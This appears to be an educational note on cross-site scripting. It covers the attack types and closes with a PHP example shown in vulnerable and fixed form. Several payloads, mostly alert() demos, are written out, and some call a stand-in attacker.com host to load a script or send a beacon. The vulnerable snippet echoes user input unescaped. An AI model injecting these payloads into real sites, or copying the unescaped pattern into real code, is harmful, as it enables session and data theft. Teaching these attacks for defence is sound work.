# Cross Site Scripting (XSS)

## Exploitable Fields
Fields where users are allowed to insert data, and in response, user generated content is returned. This can be a variety of different fileds including:

- Search queries
- Form inputs (text fields, text areas)
- URL parameters
- Chat messages
- Comments sections
- User profiles


## Impact of Exploitation
Since XXS attacks are executed upon accessing a site, depending on the strucutre of the attack, it can be affected against numerous users.

- Session Hijacking: Stealing user sessions to perform actions on behalf of the user.
- Cookie Theft: Stealing session cookies to impersonate users.
- Data Theft: Extracting sensitive user information from the page.
- Keylogging: Capturing user keystrokes.
- Phishing: Redirecting users to fake login pages to steal credentials.
- Defacement: Modifying the appearance of the website.
- Malware Distribution: Redirecting users to sites hosting malware.

## Types of Cross Site Scripting (XSS)

### Reflective XSS
In a reflective XXS attack, upon exploitation the malicious script is reflected off of the web server and executes on the users browser window. The traditional example of this is a URL with a XXS payload appended to the end being sent to a victim, where the payload triggers the 'alert' function of the browser. 

``` http://example.com/search?query=<script>alert('XSS Attack!');</script> ```

### Stored/Persistant XXS
In a stored or persistant XXS attack, the exploit script is saved into a databse or onto the website for persistant execution upon ever visit to the site. A common example of this is a webpage that allows for user comments or posts, where the XXS script is inserted as a comment or uploaded to the page in general. 

In a comment: ``` <script>alert('XSS Attack!');</script>  ```
In a forum post: ``` <script src="http://attacker.com/malicious.js"></script> ```


### Blind Reflective & Stored/Persistant XSS
In a blind reflective attack, the user does not see evidence of the attacks success on their browser page. Instead they can have the script call out to an external web server and check for attempted access in order to validate. Or use time delays in order to check that the script is succesful. This is successfull The following script is an example that could be injected into the mentioned applicable fields. 

Out-of-Band XXS:
```
<script>
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "http://attacker.com/logger?data=executed", true);
  xhr.send();
</script>
```

Time-Based XXS
```
<script>
  var startTime = new Date().getTime();
  while (new Date().getTime() - startTime < 5000) {}
  var img = new Image();
  img.src = "http://attacker.com/logger?data=executed";
</script>
```

### DOM-Based XSS:
In a DOM-based XSS attack, the vulnerability is in the client-side code (usually JavaScript) rather than the server-side code. The malicious payload is processed by the client's browser and can manipulate the DOM to execute arbitrary code. This vulnerability is associated to the browser the user is using while accessing a site.

```
http://example.com/page#<script>alert('XSS Attack!');</script>
```


### Client-Side Template Injection (CSTI) 
If the application uses client-side templating engines like AngularJS or Vue.js and evaluates expressions within double curly braces ({{ ... }}), the attacker can inject arbitrary JavaScript code. This XXS type is also blind, and would execute any JS included inside the mentioned brackets. 


### Self (XSS)
Has to do with social engineer a victim into entering a script in their browsers console. 

## Vulnerable Code Example
In a website where the page welcomes it's users with "Welcome *Username* " where it pulls the username from the url example.com/welcome.php?username=*username* and used the following vulnerable code, it would be vulnerable to the reflective XXS attack ``` example.com/welcome.php?username=<script>alert('XSS Attack!');</script> ``` The vulnerable code may look like the following as it does not sanatize the input.

```
<!DOCTYPE html>
<html>
<head>
    <title>XSS Vulnerable Page</title>
</head>
<body>
    <h1>Welcome, <?php echo $_GET['username']; ?>!</h1>
</body>
</html>
```

## Remediated Code Example
The remediated code for the above section would be something like the following, where the $_Get['username'] function is santized to only be a html string and not executable. 

```
<!DOCTYPE html>
<html>
<head>
    <title>XSS Protected Page</title>
</head>
<body>
    <h1>Welcome, <?php echo htmlspecialchars($_GET['username']); ?>!</h1>
</body>
</html>
```




